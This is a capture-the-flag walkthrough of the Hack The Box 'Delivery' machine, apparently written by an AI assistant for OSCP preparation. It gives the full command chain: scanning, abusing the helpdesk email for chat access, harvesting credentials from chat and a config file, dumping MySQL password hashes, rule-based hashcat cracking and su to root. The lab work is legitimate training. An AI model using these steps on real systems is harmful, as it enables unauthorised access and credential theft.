## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)
- Prep: [OSCP](OSCP.md)

---

## 🔎 Recon
```bash
nmap -sV -p- -T4 -oA nmap/delivery-all 10.10.10.222
```
- Open ports: 22 (SSH), 80 (HTTP), 8065 (unknown service initially)
- `/etc/hosts` additions:
  ```
  10.10.10.222 delivery.htb helpdesk.delivery.htb
  ```

---

## 🏠 Web Enumeration
- **[Port 80](HTTP.md):** Static homepage
- **Subdomain found:** helpdesk.delivery.htb
- **Port 8065:** Mattermost interface at `http://delivery.htb:8065/`

### Helpdesk Ticket System
- Created new ticket on `helpdesk.delivery.htb`
  - Email: `test1@delivery.htb`
  - Ticket ID: `4076334`
- Used this info to access Mattermost:
  - Signup using `4076334@delivery.htb`
  - Got email verification link via helpdesk panel

---

## 🔑 Credentials & User Shell
- From Mattermost `town-square` channel:
  ```
  maildeliverer : Youve_G0t_Mail!
  ```
- SSH as maildeliverer:
  ```bash
  ssh maildeliverer@10.10.10.222
  # Password: Youve_G0t_Mail!
  ```
- Captured user flag from `~/user.txt`

---

## ⬆️ Privilege Escalation
### Step 1: Find Credentials
- File: `/opt/mattermost/config/config.json`
```json
"SqlSettings": {
    "DriverName": "mysql",
    "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost",
```
- Credentials: `mmuser : Crack_The_MM_Admin_PW`

### Step 2: Dump Users Table
```bash
mysql -h 127.0.0.1 -u mmuser -p
# Password: Crack_The_MM_Admin_PW
MariaDB> use mattermost;
MariaDB> SELECT Username,Password FROM Users;
```
- Found bcrypt hash for `root`

### Step 3: Crack Bcrypt Hash
- Hint from Mattermost: `PleaseSubscribe!` related password
- Custom wordlist generation:
```bash
echo 'PleaseSubscribe!' > pass.lst
hashcat --stdout pass.lst -r /usr/share/hashcat/rules/best64.rule > custom.lst
```
- Crack hash:
```bash
hashcat -m 3200 -a 0 -o cracked.txt <HASH> custom.lst
```
- Cracked password: `PleaseSubscribe!21`

### Step 4: Root Access
```bash
su root
# Password: PleaseSubscribe!21
```
- Captured root flag from `~/root.txt`

---

## 📄 Summary
- Enumerated support ticket system to gain Mattermost access
- Extracted SSH credentials from chat
- Used MySQL access to retrieve root hash
- Cracked bcrypt hash using rules
- Escalated to root and captured all flags

---

Let me know if you'd like this exported as PDF or visualized as a flow diagram! 🔐

